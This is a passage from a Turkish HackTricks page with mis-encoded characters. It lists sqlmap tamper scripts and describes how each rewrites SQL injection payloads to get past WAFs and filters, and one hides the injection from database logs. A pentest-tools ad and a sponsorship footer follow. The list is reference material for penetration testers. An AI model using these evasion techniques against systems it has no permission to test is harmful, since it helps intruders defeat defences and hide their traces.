| bluecoat.py                  | SQL ifadesinden sonra boÅŸluk karakterini geÃ§erli bir rastgele boÅŸ karakterle deÄŸiÅŸtirir. ArdÄ±ndan karakter = yerine LIKE operatÃ¶rÃ¼ ile deÄŸiÅŸtirir |
| chardoubleencode.py          | Verilen kodda bulunan tÃ¼m karakterleri Ã§ift URL kodlar (zaten kodlanmÄ±ÅŸ olanlarÄ± iÅŸlemez)                                           |
| commalesslimit.py            | 'LIMIT M, N' gibi Ã¶rnekleri 'LIMIT N OFFSET M' ile deÄŸiÅŸtirir                                                                        |
| commalessmid.py              | 'MID(A, B, C)' gibi Ã¶rnekleri 'MID(A FROM B FOR C)' ile deÄŸiÅŸtirir                                                                   |
| concat2concatws.py           | 'CONCAT(A, B)' gibi Ã¶rnekleri 'CONCAT\_WS(MID(CHAR(0), 0, 0), A, B)' ile deÄŸiÅŸtirir                                                  |
| charencode.py                | Verilen kodda bulunan tÃ¼m karakterleri URL kodlar (zaten kodlanmÄ±ÅŸ olanlarÄ± iÅŸlemez)                                                 |
| charunicodeencode.py         | Verilen kodda kodlanmamÄ±ÅŸ karakterleri Unicode URL kodlar (zaten kodlanmÄ±ÅŸ olanlarÄ± iÅŸlemez). "%u0022"                               |
| charunicodeescape.py         | Verilen kodda kodlanmamÄ±ÅŸ karakterleri Unicode URL kodlar (zaten kodlanmÄ±ÅŸ olanlarÄ± iÅŸlemez). "\u0022"                               |
| equaltolike.py               | TÃ¼m eÅŸitlik operatÃ¶rlerini ('=') 'LIKE' operatÃ¶rÃ¼ ile deÄŸiÅŸtirir                                                                     |
| escapequotes.py              | TÄ±rnak iÅŸaretlerini (' ve ") kaÃ§Ä±ÅŸ karakteriyle deÄŸiÅŸtirir                                                                           |
| greatest.py                  | BÃ¼yÃ¼k olan operatÃ¶rÃ¼ ('>') 'GREATEST' karÅŸÄ±lÄ±ÄŸÄ±yla deÄŸiÅŸtirir                                                                       |
| halfversionedmorekeywords.py | Her anahtar kelimeye sÃ¼rÃ¼mlendirilmiÅŸ MySQL yorumunu ekler                                                                            |
| ifnull2ifisnull.py           | 'IFNULL(A, B)' gibi Ã¶rnekleri 'IF(ISNULL(A), B, A)' ile deÄŸiÅŸtirir                                                                   |
| modsecurityversioned.py      | Tam sorguyu sÃ¼rÃ¼mlendirilmiÅŸ yorumla kapsar                                                                                          |
| modsecurityzeroversioned.py  | Tam sorguyu sÄ±fÄ±r sÃ¼rÃ¼mlÃ¼ yorumla kapsar                                                                                             |
| multiplespaces.py            | SQL anahtar kelimelerinin etrafÄ±na birden fazla boÅŸluk ekler                                                                         |
| nonrecursivereplacement.py   | Ã–nceden tanÄ±mlanmÄ±ÅŸ SQL anahtar kelimelerini deÄŸiÅŸtirme iÃ§in uygun temsilcilerle deÄŸiÅŸtirir (Ã¶rneÄŸin .replace("SELECT", "")) filtreler |
| percentage.py                | Her karakterin Ã¶nÃ¼ne bir yÃ¼zde iÅŸareti ('%') ekler                                                                                   |
| overlongutf8.py              | Verilen kodda bulunan tÃ¼m karakterleri dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r (zaten kodlanmÄ±ÅŸ olanlarÄ± iÅŸlemez)                                                 |
| randomcase.py                | Her anahtar kelime karakterini rastgele bir bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf deÄŸeriyle deÄŸiÅŸtirir                                                    |
| randomcomments.py            | SQL anahtar kelimelerine rastgele yorumlar ekler                                                                                     |
| securesphere.py              | Ã–zel oluÅŸturulmuÅŸ bir dize ekler                                                                                                    |
| sp\_password.py              | Otomatik olarak DBMS gÃ¼nlÃ¼klerinden gizlemek iÃ§in kodun sonuna 'sp\_password' ekler                                                  |
| space2comment.py             | BoÅŸluk karakterini (' ') yorumlarla deÄŸiÅŸtirir                                                                                      |
| space2dash.py                | BoÅŸluk karakterini (' ') tire yorumu ('--') ile deÄŸiÅŸtirir ve ardÄ±ndan rastgele bir dize ve yeni bir satÄ±r ('\n') ekler               |
| space2hash.py                | BoÅŸluk karakterini (' ') bir diyez karakteri ('#') ile deÄŸiÅŸtirir ve ardÄ±ndan rastgele bir dize ve yeni bir satÄ±r ('\n') ekler         |
| space2morehash.py            | BoÅŸluk karakterini (' ') bir diyez karakteri ('#') ile deÄŸiÅŸtirir ve ardÄ±ndan rastgele bir dize ve yeni bir satÄ±r ('\n') ekler         |
| space2mssqlblank.py          | BoÅŸluk karakterini (' ') geÃ§erli bir alternatif karakter kÃ¼mesinden rastgele bir boÅŸ karakterle deÄŸiÅŸtirir                          |
| space2mssqlhash.py           | BoÅŸluk karakterini (' ') bir diyez karakteri ('#') ile deÄŸiÅŸtirir ve ardÄ±ndan yeni bir satÄ±r ('\n') ekler                            |
| space2mysqlblank.py          | BoÅŸluk karakterini (' ') geÃ§erli bir alternatif karakter kÃ¼mesinden rastgele bir boÅŸ karakterle deÄŸiÅŸtirir                          |
| space2mysqldash.py           | BoÅŸluk karakterini (' ') tire yorumu ('--') ile deÄŸiÅŸtirir ve ardÄ±ndan yeni bir satÄ±r ('\n') ekler                                    |
| space2plus.py                | BoÅŸluk karakterini (' ') artÄ± ('+') ile deÄŸiÅŸtirir                                                                                  |
| space2randomblank.py         | BoÅŸluk karakterini (' ') geÃ§erli bir alternatif karakter kÃ¼mesinden rastgele bir boÅŸ karakterle deÄŸiÅŸtirir                          |
| symboliclogical.py           | AND ve OR mantÄ±ksal operatÃ¶rlerini sembolik karÅŸÄ±lÄ±klarÄ±yla deÄŸiÅŸtirir (&& ve                                                         |
| unionalltounion.py           | UNION ALL SELECT ifadesini UNION SELECT ile deÄŸiÅŸtirir                                                                               |
| unmagicquotes.py             | TÄ±rnak iÅŸaretini (') Ã§oklu bayt kombinasyonu %bf%27 ile deÄŸiÅŸtirir ve sonuna genel bir yorum ekler (Ã§alÄ±ÅŸmasÄ± iÃ§in)                   |
| uppercase.py                 | Her anahtar kelime karakterini bÃ¼yÃ¼k harf deÄŸeri 'INSERT' ile deÄŸiÅŸtirir                                                             |
| varnish.py                   | Bir HTTP baÅŸlÄ±ÄŸÄ± 'X-originating-IP' ekler                                                                                            |
| versionedkeywords.py         | Her fonksiyon olmayan anahtar kelimeyi sÃ¼rÃ¼mlendirilmiÅŸ MySQL yorumuyla Ã§evreler                                                      |
| versionedmorekeywords.py     | Her anahtar kelimeyi sÃ¼rÃ¼mlendirilmiÅŸ MySQL yorumuyla Ã§evreler                                                                        |
| xforwardedfor.py             | Sahte bir HTTP baÅŸlÄ±ÄŸÄ± 'X-Forwarded-For' ekler                                                                                        |

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Zafiyet deÄŸerlendirmesi ve penetrasyon testi iÃ§in anÄ±nda kullanÄ±labilir kurulum**. 20'den fazla araÃ§ ve Ã¶zellikle birlikte her yerden tam bir pentest Ã§alÄ±ÅŸtÄ±rÄ±n. Pentester'larÄ± deÄŸiÅŸtirmiyoruz - onlara daha derine kazma, kabuklarÄ± patlatma ve eÄŸlenme zamanÄ± kazandÄ±rmak iÃ§in Ã¶zel araÃ§lar, tespit ve istismar modÃ¼lleri geliÅŸtiriyoruz.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklam vermek veya HackTricks'Ä± PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
